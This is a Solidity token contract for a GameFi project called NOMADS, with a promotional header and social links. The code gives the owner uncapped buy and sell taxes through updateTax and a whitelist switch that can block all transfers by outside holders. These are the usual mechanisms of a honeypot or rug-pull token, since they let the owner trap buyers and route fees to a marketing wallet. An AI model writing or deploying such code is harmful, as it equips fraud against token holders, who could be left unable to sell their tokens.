/*

$NOMADS

In the vast expanse of the post-apocalyptic wasteland where the Earth has stopped rotating plunging humanity into a perpetual day-night cycle, players embark on a journey of survival, conquest, and civilization-building in Nomads. 

As a lone wanderer known simply as the Nomad, players must navigate the harsh landscape, gathering resources and forging alliances to establish their own thriving settlements...

Socials
https://nomads.gitbook.io/nomads-gamefi/
https://t.me/PlayNOMADS
https://playnomads.com
https://twitter.com/PlayNOMADS

*/

pragma solidity 0.8.23;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    event MaxTxAmountUpdated(uint _maxTxAmount);
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds._allowances[sender][_msgSender()] >= amount,
            "Transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()] - amount
        );
        return true;
    }
    function enableWhitelist() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.whitelistOn = true;
    }
    function disableWhitelist() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.whitelistOn = false;
    }
    function addToWhitelist(address[] memory addresses) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < addresses.length; i++) {
            ds.whitelist[addresses[i]] = true;
        }
    }
    function removeFromWhitelist(address[] memory addresses) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < addresses.length; i++) {
            ds.whitelist[addresses[i]] = false;
        }
    }
    function updateTax(uint256 BuyTax, uint256 SellTax) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._BuyTax = BuyTax;
        ds._SellTax = SellTax;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxTxAmount = _tTotal;
        ds._maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function openTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingOpen, "Trading is already open");
        ds.uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), _tTotal);
        ds.uniswapV2Pair = IUniswapV2Factory(ds.uniswapV2Router.factory())
            .createPair(address(this), ds.uniswapV2Router.WETH());
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
        ds.swapEnabled = true;
        ds.tradingOpen = true;
    }
    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (tokenAmount == 0) {
            return;
        }
        if (!ds.tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            from != address(0),
            "ERC20: Can't transfer from the zero address"
        );
        require(to != address(0), "ERC20: Can't transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (!ds._isExcludedFromFee[from] && !ds._isExcludedFromFee[to]) {
            if (ds.whitelistOn && !ds.whitelist[from] && !ds.whitelist[to]) {
                revert("Transfer not allowed: address not in ds.whitelist");
            }

            if (from == ds.uniswapV2Pair && to != address(ds.uniswapV2Router)) {
                require(
                    amount < ds._maxTxAmount,
                    "Exceeds the ds._maxTxAmount."
                );
                require(
                    balanceOf(to) + amount < ds._maxWalletSize,
                    "Exceeds the ds._maxWalletSize."
                );
            }

            if (from == ds.uniswapV2Pair && to != address(this)) {
                taxAmount = (amount * ds._BuyTax) / 100;
            }
            if (to == ds.uniswapV2Pair && from != address(this)) {
                taxAmount = (amount * ds._SellTax) / 100;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !ds.inSwap &&
                to == ds.uniswapV2Pair &&
                ds.swapEnabled &&
                contractTokenBalance > ds._taxSwapThreshold
            ) {
                uint256 amountToSwap = (amount < contractTokenBalance &&
                    amount < ds._maxTaxSwap)
                    ? amount
                    : (contractTokenBalance < ds._maxTaxSwap)
                        ? contractTokenBalance
                        : ds._maxTaxSwap;
                swapTokensForEth(amountToSwap);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            ds._balances[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        ds._balances[from] = ds._balances[from] - amount;
        ds._balances[to] = ds._balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._marketingWallet.transfer(amount);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            owner != address(0),
            "ERC20: Can't approve from the zero address"
        );
        require(
            spender != address(0),
            "ERC20: Can't approve to the zero address"
        );
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
